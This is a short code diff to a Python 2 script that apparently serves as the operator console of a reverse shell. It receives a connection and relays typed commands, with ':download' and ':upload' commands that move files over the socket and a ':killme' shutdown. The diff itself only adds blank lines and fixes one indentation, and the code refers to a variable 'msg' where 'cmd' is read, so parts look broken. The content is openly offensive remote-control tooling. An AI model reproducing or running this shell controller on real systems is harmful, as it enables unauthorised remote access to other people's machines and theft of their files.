@@ -33,10 +33,12 @@ while True:
     data = conn.recv(socksize)
     cmd = raw_input(data)
     conn.sendall(str(cmd))
+
     if cmd == (':killme'):
         print("[!] Shutting down shell!")
         conn.close()
         sys.exit(0)
+
     elif cmd.startswith(':download'):
         getname = msg.split(" ")
         rem_file = getname[1]
@@ -48,15 +50,18 @@ while True:
         if os.path.exists(filename) is True:
             print("[+] Download complete.")
             print("[+] File location: " + os.getcwd()+"/"+filename)
+
     elif cmd.startswith(':upload'):
-	getname = msg.split(" ")
+        getname = msg.split(" ")
         loc_file = getname[1]
         sendfile = open(loc_file, "r")
         filedata = sendfile.read()
         sendfile.close()
         conn.sendall(filedata)
+
     elif cmd == (":exec"):
         print("Command not yet fully implemented!")
+
     elif cmd == (":help"):
         print(" Available Commands: ")
         print("---------------------------------")
